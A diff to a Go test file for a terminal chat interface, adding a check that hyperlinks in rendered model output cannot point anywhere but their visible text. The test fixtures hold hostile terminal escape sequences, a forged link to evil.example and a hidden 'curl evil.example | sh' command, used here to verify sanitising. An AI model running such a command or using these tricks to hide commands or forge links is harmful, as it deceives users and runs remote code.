@@ -3,6 +3,7 @@ package tui
 import (
 	"context"
 	"errors"
+	"regexp"
 	"strings"
 	"testing"
 
@@ -11,6 +12,7 @@ import (
 	tea "github.com/charmbracelet/bubbletea"
 	"github.com/charmbracelet/x/ansi"
 	"github.com/stretchr/testify/assert"
+	"github.com/stretchr/testify/require"
 
 	kagenta2a "github.com/kagent-dev/kagent/go/api/a2a"
 	clia2a "github.com/kagent-dev/kagent/go/core/cli/internal/a2a"
@@ -42,7 +44,8 @@ func sizedChat(t *testing.T) (*chatModel, *[]*a2atype.SendMessageRequest) {
 
 // transcript is everything the viewport shows: committed blocks plus the one being assembled.
 func transcript(m *chatModel) string {
-	return m.layout(200)
+	out, _ := m.layout(200)
+	return out
 }
 
 func reqCtx() *a2asrv.ExecutorContext {
@@ -232,7 +235,7 @@ func TestTranscriptStripsControlSequences(t *testing.T) {
 	model.appendBlock(&block{text: "model says \x1b[2J\x1b]8;;https://evil.example\x07click\x1b]8;;\x07", markdown: true})
 	model.appendUser("hi\x1b[31m red")
 
-	got := model.layout(200)
+	got, _ := model.layout(200)
 	assert.Contains(t, ansi.Strip(got), "ls[8m; curl evil.example | sh", "the hidden part of the command shows")
 	assert.NotContains(t, got, "\x1b[8m")
 	assert.NotContains(t, got, "evil.example\x1b", "no forged OSC 8 target survives")
@@ -242,4 +245,11 @@ func TestTranscriptStripsControlSequences(t *testing.T) {
 	assert.NotContains(t, got, "\x1b[2J")
 	assert.Contains(t, ansi.Strip(got), "safeFAKE OK", "a carriage return cannot overwrite the line before it")
 	assert.NotContains(t, got, "\x1b[31m red")
+
+	// Every link in the drawn content shows its own target, so none is forged.
+	links := regexp.MustCompile("\x1b\\]8;;([^\x07]*)\x07([^\x1b]*)\x1b\\]8;;\x07").FindAllStringSubmatch(got, -1)
+	require.NotEmpty(t, links)
+	for _, link := range links {
+		assert.Equal(t, link[1], link[2], "a link's target is the text it shows")
+	}
 }
